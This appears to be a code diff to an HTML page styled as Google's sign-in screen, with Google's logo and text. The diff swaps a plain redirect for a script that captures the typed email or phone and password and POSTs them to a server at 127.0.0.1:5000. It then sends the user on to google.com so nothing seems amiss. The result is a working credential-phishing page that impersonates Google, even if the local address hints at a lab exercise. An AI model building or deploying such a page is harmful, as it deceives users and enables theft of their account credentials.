@@ -80,11 +80,6 @@
             text-decoration: underline;
         }
     </style>
-    <script>
-        function redirectToGoogle() {
-            window.location.href = "https://www.google.com";
-        }
-    </script>
 </head>
 <body>
 
@@ -92,7 +87,7 @@
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google" class="logo">
         <h2>Sign in</h2>
         <p>Use your Google Account</p>
-        <form onsubmit="event.preventDefault(); redirectToGoogle();">
+        <form onsubmit="loginUser(event);">
             <input type="text" name="username" placeholder="Email or phone" required><br>
             <input type="password" name="password" placeholder="Enter your password" required><br>
             <a href="#" class="links">Forgot password?</a>
@@ -100,6 +95,29 @@
         </form>
         <a href="#" class="links">Create account</a>
     </div>
+
+    <script>
+        function loginUser(event) {
+            event.preventDefault();
+
+            let username = document.querySelector('input[name="username"]').value;
+            let password = document.querySelector('input[name="password"]').value;
+
+            fetch('http://127.0.0.1:5000/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert(data.message);
+                if (data.status === "success") {
+                    window.location.href = "https://www.google.com"; // Redirect on success
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
 
 </body>
 </html>
